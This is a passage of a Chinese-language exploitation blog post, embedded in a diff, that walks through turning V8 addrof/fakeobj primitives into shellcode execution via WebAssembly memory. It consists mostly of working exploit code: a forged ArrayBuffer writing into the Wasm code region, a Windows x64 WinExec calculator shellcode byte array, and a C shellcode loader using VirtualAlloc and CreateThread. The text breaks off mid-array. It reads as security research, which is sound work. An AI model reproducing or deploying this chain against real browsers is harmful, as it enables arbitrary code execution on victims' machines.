+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">buf_for_fake_arr</span>[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">itof</span>(<span style="color:#a6e22e">make_qword</span>(<span style="color:#a6e22e">double_array_map</span>, <span style="color:#ae81ff">0</span>));
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// [elems, len]
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">buf_for_fake_arr</span>[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">itof</span>(<span style="color:#a6e22e">make_qword</span>(<span style="color:#a6e22e">fake_fixed_array_ptr</span>, <span style="color:#ae81ff">8</span> <span style="color:#f92672">&lt;&lt;</span> <span style="color:#ae81ff">1</span>));
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">start_ptr_of_fake_arr</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">addrof</span>(<span style="color:#a6e22e">buf_for_fake_arr</span>) <span style="color:#f92672">-</span> <span style="color:#a6e22e">BigInt</span>(<span style="color:#ae81ff">0x10</span>);
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">instruction_ptr_reader</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">fakeobj</span>(<span style="color:#a6e22e">start_ptr_of_fake_arr</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#a6e22e">ftoi</span>(<span style="color:#a6e22e">instruction_ptr_reader</span>[<span style="color:#ae81ff">0</span>]).<span style="color:#a6e22e">toString</span>(<span style="color:#ae81ff">16</span>));
+</span></span></code></pre></div><p>输出：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>0x02f8081d4ba1 &lt;Instance map <span style="color:#f92672">=</span> 000002F808206F61&gt;
+</span></span><span style="display:flex;"><span>81d4ba1
+</span></span><span style="display:flex;"><span>81d4c09
+</span></span><span style="display:flex;"><span>be50a41000
+</span></span></code></pre></div><p>伪造 <code>ArrayBuffer</code>，把 shellcode 拷贝到 <code>be50a41000</code>，再调用 WebAssembly 块导出的 <code>main</code> 函数，实际上执行的就是 shellcode 了。</p>
+<p>用 0xCC 作为 shellcode 验证效果：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#a6e22e">instruction_ptr</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">ftoi</span>(<span style="color:#a6e22e">instruction_ptr_reader</span>[<span style="color:#ae81ff">0</span>]);
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#a6e22e">instruction_ptr</span>.<span style="color:#a6e22e">toString</span>(<span style="color:#ae81ff">16</span>));
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">shellcode_zone</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">Uint8Array</span>(<span style="color:#a6e22e">fake_array_buffer</span>(<span style="color:#a6e22e">instruction_ptr</span>, <span style="color:#ae81ff">1</span>));
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">shellcode_zone</span>[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xcc</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">wasmInstance</span>.<span style="color:#a6e22e">exports</span>.<span style="color:#a6e22e">main</span>()
+</span></span></code></pre></div><p>成功执行到0xCC，触发中断。</p>
+<p><img src="/assets/images/Pasted%20image%2020220224014552.png" alt=""></p>
+<p>从 <a href="https://github.com/boku7/x64win-DynamicNoNull-WinExec-PopCalc-Shellcode">github</a> 找了一个弹计算器的shellcode, 把 c 代码部分编译成 exe，然后后用
+ida 提取出 shellcode。</p>
+<p><img src="/assets/images/Pasted%20image%2020220224221352.png" alt=""></p>
+<p>毕竟是网上找的 shellcode，先单步调试一遍的，验证安全性。在数组开头加上 0xCC，便于调试。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#a6e22e">shellcode_zone</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">Uint8Array</span>(<span style="color:#a6e22e">fake_array_buffer</span>(<span style="color:#a6e22e">instruction_ptr</span>, <span style="color:#ae81ff">1024</span>));
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">shellcode_src</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">Uint8Array</span>([<span style="color:#ae81ff">0xcc</span>, <span style="color:#ae81ff">0x48</span>, <span style="color:#ae81ff">0x31</span>, <span style="color:#ae81ff">0xFF</span>, <span style="color:#ae81ff">0x48</span>, <span style="color:#ae81ff">0xF7</span>, <span style="color:#ae81ff">0xE7</span>, <span style="color:#ae81ff">0x65</span>, <span style="color:#ae81ff">0x48</span>, <span style="color:#ae81ff">0x8B</span>, <span style="color:#ae81ff">0x58</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">0x60</span>, <span style="color:#ae81ff">0x48</span>, <span style="color:#ae81ff">0x8B</span>, <span style="color:#ae81ff">0x5B</span>, <span style="color:#ae81ff">0x18</span>, <span style="color:#ae81ff">0x48</span>, <span style="color:#ae81ff">0x8B</span>, <span style="color:#ae81ff">0x5B</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x48</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">0x8B</span>, <span style="color:#ae81ff">0x1B</span>, <span style="color:#ae81ff">0x48</span>, <span style="color:#ae81ff">0x8B</span>, <span style="color:#ae81ff">0x1B</span>, <span style="color:#ae81ff">0x48</span>, <span style="color:#ae81ff">0x8B</span>, <span style="color:#ae81ff">0x5B</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x49</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">0x89</span>, <span style="color:#ae81ff">0xD8</span>, <span style="color:#ae81ff">0x8B</span>, <span style="color:#ae81ff">0x5B</span>, <span style="color:#ae81ff">0x3C</span>, <span style="color:#ae81ff">0x4C</span>, <span style="color:#ae81ff">0x01</span>, <span style="color:#ae81ff">0xC3</span>, <span style="color:#ae81ff">0x48</span>, <span style="color:#ae81ff">0x31</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">0xC9</span>, <span style="color:#ae81ff">0x66</span>, <span style="color:#ae81ff">0x81</span>, <span style="color:#ae81ff">0xC1</span>, <span style="color:#ae81ff">0xFF</span>, <span style="color:#ae81ff">0x88</span>, <span style="color:#ae81ff">0x48</span>, <span style="color:#ae81ff">0xC1</span>, <span style="color:#ae81ff">0xE9</span>, <span style="color:#ae81ff">0x08</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">0x8B</span>, <span style="color:#ae81ff">0x14</span>, <span style="color:#ae81ff">0x0B</span>, <span style="color:#ae81ff">0x4C</span>, <span style="color:#ae81ff">0x01</span>, <span style="color:#ae81ff">0xC2</span>, <span style="color:#ae81ff">0x4D</span>, <span style="color:#ae81ff">0x31</span>, <span style="color:#ae81ff">0xD2</span>, <span style="color:#ae81ff">0x44</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">0x8B</span>, <span style="color:#ae81ff">0x52</span>, <span style="color:#ae81ff">0x1C</span>, <span style="color:#ae81ff">0x4D</span>, <span style="color:#ae81ff">0x01</span>, <span style="color:#ae81ff">0xC2</span>, <span style="color:#ae81ff">0x4D</span>, <span style="color:#ae81ff">0x31</span>, <span style="color:#ae81ff">0xDB</span>, <span style="color:#ae81ff">0x44</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">0x8B</span>, <span style="color:#ae81ff">0x5A</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x4D</span>, <span style="color:#ae81ff">0x01</span>, <span style="color:#ae81ff">0xC3</span>, <span style="color:#ae81ff">0x4D</span>, <span style="color:#ae81ff">0x31</span>, <span style="color:#ae81ff">0xE4</span>, <span style="color:#ae81ff">0x44</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">0x8B</span>, <span style="color:#ae81ff">0x62</span>, <span style="color:#ae81ff">0x24</span>, <span style="color:#ae81ff">0x4D</span>, <span style="color:#ae81ff">0x01</span>, <span style="color:#ae81ff">0xC4</span>, <span style="color:#ae81ff">0xEB</span>, <span style="color:#ae81ff">0x32</span>, <span style="color:#ae81ff">0x5B</span>, <span style="color:#ae81ff">0x59</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">0x48</span>, <span style="color:#ae81ff">0x31</span>, <span style="color:#ae81ff">0xC0</span>, <span style="color:#ae81ff">0x48</span>, <span style="color:#ae81ff">0x89</span>, <span style="color:#ae81ff">0xE2</span>, <span style="color:#ae81ff">0x51</span>, <span style="color:#ae81ff">0x48</span>, <span style="color:#ae81ff">0x8B</span>, <span style="color:#ae81ff">0x0C</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">0x24</span>, <span style="color:#ae81ff">0x48</span>, <span style="color:#ae81ff">0x31</span>, <span style="color:#ae81ff">0xFF</span>, <span style="color:#ae81ff">0x41</span>, <span style="color:#ae81ff">0x8B</span>, <span style="color:#ae81ff">0x3C</span>, <span style="color:#ae81ff">0x83</span>, <span style="color:#ae81ff">0x4C</span>, <span style="color:#ae81ff">0x01</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">0xC7</span>, <span style="color:#ae81ff">0x48</span>, <span style="color:#ae81ff">0x89</span>, <span style="color:#ae81ff">0xD6</span>, <span style="color:#ae81ff">0xF3</span>, <span style="color:#ae81ff">0xA6</span>, <span style="color:#ae81ff">0x74</span>, <span style="color:#ae81ff">0x05</span>, <span style="color:#ae81ff">0x48</span>, <span style="color:#ae81ff">0xFF</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">0xC0</span>, <span style="color:#ae81ff">0xEB</span>, <span style="color:#ae81ff">0xE6</span>, <span style="color:#ae81ff">0x59</span>, <span style="color:#ae81ff">0x66</span>, <span style="color:#ae81ff">0x41</span>, <span style="color:#ae81ff">0x8B</span>, <span style="color:#ae81ff">0x04</span>, <span style="color:#ae81ff">0x44</span>, <span style="color:#ae81ff">0x41</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">0x8B</span>, <span style="color:#ae81ff">0x04</span>, <span style="color:#ae81ff">0x82</span>, <span style="color:#ae81ff">0x4C</span>, <span style="color:#ae81ff">0x01</span>, <span style="color:#ae81ff">0xC0</span>, <span style="color:#ae81ff">0x53</span>, <span style="color:#ae81ff">0xC3</span>, <span style="color:#ae81ff">0x48</span>, <span style="color:#ae81ff">0x31</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">0xC9</span>, <span style="color:#ae81ff">0x80</span>, <span style="color:#ae81ff">0xC1</span>, <span style="color:#ae81ff">0x07</span>, <span style="color:#ae81ff">0x48</span>, <span style="color:#ae81ff">0xB8</span>, <span style="color:#ae81ff">0x0F</span>, <span style="color:#ae81ff">0xA8</span>, <span style="color:#ae81ff">0x96</span>, <span style="color:#ae81ff">0x91</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">0xBA</span>, <span style="color:#ae81ff">0x87</span>, <span style="color:#ae81ff">0x9A</span>, <span style="color:#ae81ff">0x9C</span>, <span style="color:#ae81ff">0x48</span>, <span style="color:#ae81ff">0xF7</span>, <span style="color:#ae81ff">0xD0</span>, <span style="color:#ae81ff">0x48</span>, <span style="color:#ae81ff">0xC1</span>, <span style="color:#ae81ff">0xE8</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">0x08</span>, <span style="color:#ae81ff">0x50</span>, <span style="color:#ae81ff">0x51</span>, <span style="color:#ae81ff">0xE8</span>, <span style="color:#ae81ff">0xB0</span>, <span style="color:#ae81ff">0xFF</span>, <span style="color:#ae81ff">0xFF</span>, <span style="color:#ae81ff">0xFF</span>, <span style="color:#ae81ff">0x49</span>, <span style="color:#ae81ff">0x89</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">0xC6</span>, <span style="color:#ae81ff">0x48</span>, <span style="color:#ae81ff">0x31</span>, <span style="color:#ae81ff">0xC9</span>, <span style="color:#ae81ff">0x48</span>, <span style="color:#ae81ff">0xF7</span>, <span style="color:#ae81ff">0xE1</span>, <span style="color:#ae81ff">0x50</span>, <span style="color:#ae81ff">0x48</span>, <span style="color:#ae81ff">0xB8</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">0x9C</span>, <span style="color:#ae81ff">0x9E</span>, <span style="color:#ae81ff">0x93</span>, <span style="color:#ae81ff">0x9C</span>, <span style="color:#ae81ff">0xD1</span>, <span style="color:#ae81ff">0x9A</span>, <span style="color:#ae81ff">0x87</span>, <span style="color:#ae81ff">0x9A</span>, <span style="color:#ae81ff">0x48</span>, <span style="color:#ae81ff">0xF7</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">0xD0</span>, <span style="color:#ae81ff">0x50</span>, <span style="color:#ae81ff">0x48</span>, <span style="color:#ae81ff">0x89</span>, <span style="color:#ae81ff">0xE1</span>, <span style="color:#ae81ff">0x48</span>, <span style="color:#ae81ff">0xFF</span>, <span style="color:#ae81ff">0xC2</span>, <span style="color:#ae81ff">0x48</span>, <span style="color:#ae81ff">0x83</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">0xEC</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x41</span>, <span style="color:#ae81ff">0xFF</span>, <span style="color:#ae81ff">0xD6</span>]);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span>(<span style="color:#66d9ef">let</span> <span style="color:#a6e22e">i</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; <span style="color:#a6e22e">i</span> <span style="color:#f92672">&lt;</span> <span style="color:#a6e22e">shellcode_src</span>.<span style="color:#a6e22e">length</span>; <span style="color:#f92672">++</span><span style="color:#a6e22e">i</span>) {
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">shellcode_zone</span>[<span style="color:#a6e22e">i</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">shellcode_src</span>[<span style="color:#a6e22e">i</span>]
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">wasmInstance</span>.<span style="color:#a6e22e">exports</span>.<span style="color:#a6e22e">main</span>()
+</span></span></code></pre></div><p>调试一下确实发现了问题，不过并不是安全问题，是 <code>WinExec</code> 运行过程中发生了内存访问异常。</p>
+<p><img src="/assets/images/Pasted%20image%2020220224221751.png" alt=""></p>
+<p>但是这个目的地址是可以访问的，这是什么新型攻击手法？仔细看下发现是因为 movqs 是一条 SIMD 指令，要求操作数的地址 16 字节对齐。</p>
+<p>修改 shellcode 的源码，确保调用 <code>WinExec</code> 之前 rsp 是 16 字节对齐的：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">// runShellcode.c
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">// C Shellcode Run Code referenced from reenz0h (twitter: @sektor7net)
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;windows.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">main</span>() {
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">void</span><span style="color:#f92672">*</span> exec;
+</span></span><span style="display:flex;"><span>  BOOL rv;
+</span></span><span style="display:flex;"><span>  HANDLE th;
+</span></span><span style="display:flex;"><span>  DWORD oldprotect <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>  <span style="color:#75715e">// Shellcode
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span> payload[] <span style="color:#f92672">=</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x48\x31\xff\x48\xf7\xe7\x65\x48\x8b\x58\x60\x48\x8b\x5b\x18\x48\x8b\x5b\x20\x48\x8b\x1b\x48\x8b\x1b\x48\x8b\x5b\x20\x49\x89\xd8\x8b</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x5b\x3c\x4c\x01\xc3\x48\x31\xc9\x66\x81\xc1\xff\x88\x48\xc1\xe9\x08\x8b\x14\x0b\x4c\x01\xc2\x4d\x31\xd2\x44\x8b\x52\x1c\x4d\x01\xc2</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x4d\x31\xdb\x44\x8b\x5a\x20\x4d\x01\xc3\x4d\x31\xe4\x44\x8b\x62\x24\x4d\x01\xc4\xeb\x32\x5b\x59\x48\x31\xc0\x48\x89\xe2\x51\x48\x8b</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x0c\x24\x48\x31\xff\x41\x8b\x3c\x83\x4c\x01\xc7\x48\x89\xd6\xf3\xa6\x74\x05\x48\xff\xc0\xeb\xe6\x59\x66\x41\x8b\x04\x44\x41\x8b\x04</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x82\x4c\x01\xc0\x53\xc3\x48\x31\xc9\x80\xc1\x07\x48\xb8\x0f\xa8\x96\x91\xba\x87\x9a\x9c\x48\xf7\xd0\x48\xc1\xe8\x08\x50\x51\xe8\xb0</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xff\xff\xff\x49\x89\xc6\x48\x31\xc9\x48\xf7\xe1\x50\x48\xb8\x9c\x9e\x93\x9c\xd1\x9a\x87\x9a\x48\xf7\xd0\x50\x48\x89\xe1\x48\xff\xc2</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x48\x83\xec\x30\x66\x81\xe4\xf0\xff\x41\xff\xd6</span><span style="color:#e6db74">&#34;</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> payload_len <span style="color:#f92672">=</span> <span style="color:#ae81ff">205</span>;
+</span></span><span style="display:flex;"><span>  exec <span style="color:#f92672">=</span> <span style="color:#a6e22e">VirtualAlloc</span>(<span style="color:#ae81ff">0</span>, payload_len, MEM_COMMIT <span style="color:#f92672">|</span> MEM_RESERVE, PAGE_READWRITE);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">RtlMoveMemory</span>(exec, payload, payload_len);
+</span></span><span style="display:flex;"><span>  rv <span style="color:#f92672">=</span> <span style="color:#a6e22e">VirtualProtect</span>(exec, payload_len, PAGE_EXECUTE_READ, <span style="color:#f92672">&amp;</span>oldprotect);
+</span></span><span style="display:flex;"><span>  th <span style="color:#f92672">=</span> <span style="color:#a6e22e">CreateThread</span>(<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, (LPTHREAD_START_ROUTINE)exec, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">WaitForSingleObject</span>(th, <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>);
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#a6e22e">shellcode_src</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">Uint8Array</span>([<span style="color:#ae81ff">0xcc</span>,
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">0x48</span>, <span style="color:#ae81ff">0x31</span>, <span style="color:#ae81ff">0xFF</span>, <span style="color:#ae81ff">0x48</span>, <span style="color:#ae81ff">0xF7</span>, <span style="color:#ae81ff">0xE7</span>, <span style="color:#ae81ff">0x65</span>, <span style="color:#ae81ff">0x48</span>, <span style="color:#ae81ff">0x8B</span>, <span style="color:#ae81ff">0x58</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">0x60</span>, <span style="color:#ae81ff">0x48</span>, <span style="color:#ae81ff">0x8B</span>, <span style="color:#ae81ff">0x5B</span>, <span style="color:#ae81ff">0x18</span>, <span style="color:#ae81ff">0x48</span>, <span style="color:#ae81ff">0x8B</span>, <span style="color:#ae81ff">0x5B</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x48</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">0x8B</span>, <span style="color:#ae81ff">0x1B</span>, <span style="color:#ae81ff">0x48</span>, <span style="color:#ae81ff">0x8B</span>, <span style="color:#ae81ff">0x1B</span>, <span style="color:#ae81ff">0x48</span>, <span style="color:#ae81ff">0x8B</span>, <span style="color:#ae81ff">0x5B</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x49</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">0x89</span>, <span style="color:#ae81ff">0xD8</span>, <span style="color:#ae81ff">0x8B</span>, <span style="color:#ae81ff">0x5B</span>, <span style="color:#ae81ff">0x3C</span>, <span style="color:#ae81ff">0x4C</span>, <span style="color:#ae81ff">0x01</span>, <span style="color:#ae81ff">0xC3</span>, <span style="color:#ae81ff">0x48</span>, <span style="color:#ae81ff">0x31</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">0xC9</span>, <span style="color:#ae81ff">0x66</span>, <span style="color:#ae81ff">0x81</span>, <span style="color:#ae81ff">0xC1</span>, <span style="color:#ae81ff">0xFF</span>, <span style="color:#ae81ff">0x88</span>, <span style="color:#ae81ff">0x48</span>, <span style="color:#ae81ff">0xC1</span>, <span style="color:#ae81ff">0xE9</span>, <span style="color:#ae81ff">0x08</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">0x8B</span>, <span style="color:#ae81ff">0x14</span>, <span style="color:#ae81ff">0x0B</span>, <span style="color:#ae81ff">0x4C</span>, <span style="color:#ae81ff">0x01</span>, <span style="color:#ae81ff">0xC2</span>, <span style="color:#ae81ff">0x4D</span>, <span style="color:#ae81ff">0x31</span>, <span style="color:#ae81ff">0xD2</span>, <span style="color:#ae81ff">0x44</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">0x8B</span>, <span style="color:#ae81ff">0x52</span>, <span style="color:#ae81ff">0x1C</span>, <span style="color:#ae81ff">0x4D</span>, <span style="color:#ae81ff">0x01</span>, <span style="color:#ae81ff">0xC2</span>, <span style="color:#ae81ff">0x4D</span>, <span style="color:#ae81ff">0x31</span>, <span style="color:#ae81ff">0xDB</span>, <span style="color:#ae81ff">0x44</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">0x8B</span>, <span style="color:#ae81ff">0x5A</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x4D</span>, <span style="color:#ae81ff">0x01</span>, <span style="color:#ae81ff">0xC3</span>, <span style="color:#ae81ff">0x4D</span>, <span style="color:#ae81ff">0x31</span>, <span style="color:#ae81ff">0xE4</span>, <span style="color:#ae81ff">0x44</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">0x8B</span>, <span style="color:#ae81ff">0x62</span>, <span style="color:#ae81ff">0x24</span>, <span style="color:#ae81ff">0x4D</span>, <span style="color:#ae81ff">0x01</span>, <span style="color:#ae81ff">0xC4</span>, <span style="color:#ae81ff">0xEB</span>, <span style="color:#ae81ff">0x32</span>, <span style="color:#ae81ff">0x5B</span>, <span style="color:#ae81ff">0x59</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">0x48</span>, <span style="color:#ae81ff">0x31</span>, <span style="color:#ae81ff">0xC0</span>, <span style="color:#ae81ff">0x48</span>, <span style="color:#ae81ff">0x89</span>, <span style="color:#ae81ff">0xE2</span>, <span style="color:#ae81ff">0x51</span>, <span style="color:#ae81ff">0x48</span>, <span style="color:#ae81ff">0x8B</span>, <span style="color:#ae81ff">0x0C</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">0x24</span>, <span style="color:#ae81ff">0x48</span>, <span style="color:#ae81ff">0x31</span>, <span style="color:#ae81ff">0xFF</span>, <span style="color:#ae81ff">0x41</span>, <span style="color:#ae81ff">0x8B</span>, <span style="color:#ae81ff">0x3C</span>, <span style="color:#ae81ff">0x83</span>, <span style="color:#ae81ff">0x4C</span>, <span style="color:#ae81ff">0x01</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">0xC7</span>, <span style="color:#ae81ff">0x48</span>, <span style="color:#ae81ff">0x89</span>, <span style="color:#ae81ff">0xD6</span>, <span style="color:#ae81ff">0xF3</span>, <span style="color:#ae81ff">0xA6</span>, <span style="color:#ae81ff">0x74</span>, <span style="color:#ae81ff">0x05</span>, <span style="color:#ae81ff">0x48</span>, <span style="color:#ae81ff">0xFF</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">0xC0</span>, <span style="color:#ae81ff">0xEB</span>, <span style="color:#ae81ff">0xE6</span>, <span style="color:#ae81ff">0x59</span>, <span style="color:#ae81ff">0x66</span>, <span style="color:#ae81ff">0x41</span>, <span style="color:#ae81ff">0x8B</span>, <span style="color:#ae81ff">0x04</span>, <span style="color:#ae81ff">0x44</span>, <span style="color:#ae81ff">0x41</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">0x8B</span>, <span style="color:#ae81ff">0x04</span>, <span style="color:#ae81ff">0x82</span>, <span style="color:#ae81ff">0x4C</span>, <span style="color:#ae81ff">0x01</span>, <span style="color:#ae81ff">0xC0</span>, <span style="color:#ae81ff">0x53</span>, <span style="color:#ae81ff">0xC3</span>, <span style="color:#ae81ff">0x48</span>, <span style="color:#ae81ff">0x31</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">0xC9</span>, <span style="color:#ae81ff">0x80</span>, <span style="color:#ae81ff">0xC1</span>, <span style="color:#ae81ff">0x07</span>, <span style="color:#ae81ff">0x48</span>, <span style="color:#ae81ff">0xB8</span>, <span style="color:#ae81ff">0x0F</span>, <span style="color:#ae81ff">0xA8</span>, <span style="color:#ae81ff">0x96</span>, <span style="color:#ae81ff">0x91</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">0xBA</span>, <span style="color:#ae81ff">0x87</span>, <span style="color:#ae81ff">0x9A</span>, <span style="color:#ae81ff">0x9C</span>, <span style="color:#ae81ff">0x48</span>, <span style="color:#ae81ff">0xF7</span>, <span style="color:#ae81ff">0xD0</span>, <span style="color:#ae81ff">0x48</span>, <span style="color:#ae81ff">0xC1</span>, <span style="color:#ae81ff">0xE8</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">0x08</span>, <span style="color:#ae81ff">0x50</span>, <span style="color:#ae81ff">0x51</span>, <span style="color:#ae81ff">0xE8</span>, <span style="color:#ae81ff">0xB0</span>, <span style="color:#ae81ff">0xFF</span>, <span style="color:#ae81ff">0xFF</span>, <span style="color:#ae81ff">0xFF</span>, <span style="color:#ae81ff">0x49</span>, <span style="color:#ae81ff">0x89</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">0xC6</span>, <span style="color:#ae81ff">0x48</span>, <span style="color:#ae81ff">0x31</span>, <span style="color:#ae81ff">0xC9</span>, <span style="color:#ae81ff">0x48</span>, <span style="color:#ae81ff">0xF7</span>, <span style="color:#ae81ff">0xE1</span>, <span style="color:#ae81ff">0x50</span>, <span style="color:#ae81ff">0x48</span>, <span style="color:#ae81ff">0xB8</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">0x9C</span>, <span style="color:#ae81ff">0x9E</span>, <span style="color:#ae81ff">0x93</span>, <span style="color:#ae81ff">0x9C</span>, <span style="color:#ae81ff">0xD1</span>, <span style="color:#ae81ff">0x9A</span>, <span style="color:#ae81ff">0x87</span>, <span style="color:#ae81ff">0x9A</span>, <span style="color:#ae81ff">0x48</span>, <span style="color:#ae81ff">0xF7</span>,
